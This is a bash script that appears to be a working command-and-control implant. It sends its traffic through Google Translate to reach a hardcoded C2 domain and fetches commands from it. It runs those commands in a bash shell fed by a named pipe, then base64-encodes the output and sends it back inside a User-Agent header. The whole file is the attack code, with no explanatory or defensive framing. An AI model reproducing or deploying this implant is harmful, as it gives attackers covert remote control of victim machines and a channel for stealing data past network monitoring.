#!/bin/bash

running=true
user_agent="User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.110 Safari/537.36"
c2server="http://www.dedonocuegritaria.ml/"
result=""
input="/tmp/input"
output="/tmp/output"

function namedpipe(){
  rm "$input" "$output"
  mkfifo "$input"
  tail -f "$input" | /bin/bash 2>&1 > $output &
}

function getfirsturl(){
  url="https://translate.google.com/translate?&anno=2&u=$c2server"
  first=$(curl --silent "$url" -H "$user_agent" | xmllint --html --xpath '//iframe/@src' - 2>/dev/null | cut -d "=" -f2- | tr -d '"' | sed 's/amp;//g' )
} 

function getsecondurl(){
  second=$(curl --silent -L "$first" -H "$user_agent"  | xmllint --html --xpath '//a/@href' - 2>/dev/null | cut -d "=" -f2- | tr -d '"' | sed 's/amp;//g')
}

function getcommand(){
  if [[ "$result" ]];then
    command=$(curl --silent $second -H "$result" )
  else
    command=$(curl --silent $second -H "$user_agent" )

    command1=$(echo "$command" | xmllint --html --xpath '//span[@class="google-src-text"]/text()' - 2>/dev/null)
    command2=$(echo "$command" | xmllint --html --xpath '//body/text()' - 2>/dev/null)
    if [[ "$command1" ]];then
      command="$command1"
    else
      command="$command2"
    fi
  fi
}

function talktotranslate(){
  getfirsturl
  getsecondurl
  getcommand
}

function main(){
  result=""
  talktotranslate
  if [[ "$command" ]];then
    if [[ "$command" == "exit" ]];then
      running=false 
    fi
    echo -n > $output
    echo "$command" > "$input"
    sleep 2
    outputb64=$(cat $output | tr -d '\000'  | base64 | tr -d '\n'  2>/dev/null)
    if [[ "$outputb64" ]];then
      result="$user_agent|$outputb64"
      talktotranslate
    fi
  fi
}

namedpipe
while "$running";do
  main
done
